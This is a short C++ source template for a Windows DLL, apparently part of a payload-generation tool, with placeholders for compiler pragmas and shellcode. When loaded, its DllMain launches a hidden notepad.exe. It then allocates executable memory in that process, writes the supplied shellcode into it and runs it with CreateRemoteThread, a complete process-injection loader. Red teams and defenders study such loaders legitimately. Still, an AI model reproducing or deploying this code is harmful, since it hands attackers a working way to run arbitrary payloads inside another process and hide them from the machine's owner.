#include <Windows.h>

#ifndef _DEBUG
#pragma comment(linker, "/ENTRY:entry")
#endif

{{ PRAGMAS }}
VOID entry(void)
{

    HANDLE process_handle = INVALID_HANDLE_VALUE;
    HANDLE thread_handle = INVALID_HANDLE_VALUE;
    HANDLE base_addr = INVALID_HANDLE_VALUE;

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};

    RtlZeroMemory(&si, sizeof(si));
    RtlZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);

	unsigned char shellcode[] = {{ SHELLCODE }}

    CreateProcessA(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    process_handle = pi.hProcess;

    base_addr = VirtualAllocEx(process_handle, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (base_addr == INVALID_HANDLE_VALUE) return;

    if (!WriteProcessMemory(process_handle, base_addr, shellcode, sizeof(shellcode), NULL)) return;

    thread_handle = CreateRemoteThread(process_handle, 0, 0, (LPTHREAD_START_ROUTINE)base_addr, NULL, 0, NULL);
    if (!thread_handle) return;
	
	return;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
	{
		entry();
		break;
	}

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
	{
		if (lpvReserved != nullptr)
		{
			break;
		}
		break;
	}
	}
	return TRUE;
}